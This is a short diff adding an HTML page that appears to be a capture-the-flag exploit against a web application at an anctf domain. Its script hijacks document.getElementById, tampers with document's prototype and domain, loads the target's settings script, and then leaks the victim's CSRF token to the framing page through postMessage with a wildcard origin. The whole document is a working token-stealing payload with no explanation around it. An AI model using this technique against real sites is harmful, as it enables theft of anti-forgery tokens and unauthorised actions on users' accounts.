@@ -1,0 +1,18 @@
+<body>
+  <p id="_csrf"></p>
+  <script>
+    async function sleep(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
+    }
+    async function main() {
+      while (!window._csrf.value) await sleep(100);
+      top.postMessage(window._csrf.value, '*');
+    }
+    document.__proto__ = {};
+    document.domain = 'assn.anctf.tk';
+    document.getElementById = () => window._csrf;
+  </script>
+  <script src="https://assn.anctf.tk/getSettings.js" defer onload="main()">
+  </script>
+</body>
+</html>
